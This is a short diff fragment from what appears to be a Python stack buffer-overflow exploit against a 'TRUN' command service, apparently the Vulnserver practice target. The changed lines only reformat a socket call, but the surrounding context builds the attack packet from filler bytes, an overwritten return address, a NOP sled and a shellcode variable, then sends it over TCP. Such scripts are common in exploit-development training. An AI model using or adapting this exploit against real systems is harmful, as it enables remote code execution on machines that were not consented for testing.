@@ -75,9 +75,9 @@ padding = b"\x90" * nNops
 pkt = b"TRUN /.:/" + b"A" * L + eip +  padding +SH   + b"C" * (crash_offset - L -len(eip) - len(c) -nNops)
 # print(pkt) # for dbg
 
-sock = socket.socket(socket.AF_INET,
-								socket.SOCK_STREAM
-							)
+sock = socket.socket(	socket.AF_INET,
+			socket.SOCK_STREAM
+	)
 
 sock.connect((h, p));  sock.send(pkt)
 sock.close()
